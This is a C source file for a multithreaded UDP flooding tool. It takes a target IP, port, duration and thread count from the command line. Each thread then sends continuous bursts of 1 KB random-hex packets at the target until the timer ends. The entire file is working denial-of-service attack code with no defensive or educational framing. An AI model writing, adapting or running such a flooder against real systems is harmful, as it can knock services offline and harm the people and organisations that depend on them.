#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

typedef struct {
    char target_ip[16];
    int target_port;
} flood_args;

// Function to generate a random hex string
void random_hex(char *output, size_t length) {
    static const char hex_digits[] = "0123456789abcdef";
    for (size_t i = 0; i < length; ++i) {
        output[i] = hex_digits[rand() % 16];
    }
    output[length] = '\0';
}

// Function to perform network flooding
void *flood(void *arg) {
    flood_args *args = (flood_args *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    target.sin_addr.s_addr = inet_addr(args->target_ip);

    char buffer[1024];
    random_hex(buffer, sizeof(buffer) - 1);

    while (1) {
        for (int i = 0; i < 200; ++i) {
            if (sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
                perror("sendto");
                close(sock);
                pthread_exit(NULL);
            }
        }
        usleep(1000); // Sleep for 1ms to control flood rate
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <Target IP> <Port> <Duration(s)> <Threads>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *target_ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]); // Use provided number of threads

    srand(time(NULL));

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    flood_args args;
    strncpy(args.target_ip, target_ip, sizeof(args.target_ip) - 1);
    args.target_ip[sizeof(args.target_ip) - 1] = '\0';
    args.target_port = port;

    for (int i = 0; i < threads; ++i) {
        if (pthread_create(&thread_ids[i], NULL, flood, &args) != 0) {
            perror("pthread_create");
            free(thread_ids);
            exit(EXIT_FAILURE);
        }
    }

    sleep(duration);

    for (int i = 0; i < threads; ++i) {
        pthread_cancel(thread_ids[i]);
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

    printf("Flooding complete.\n");
    return 0;
}
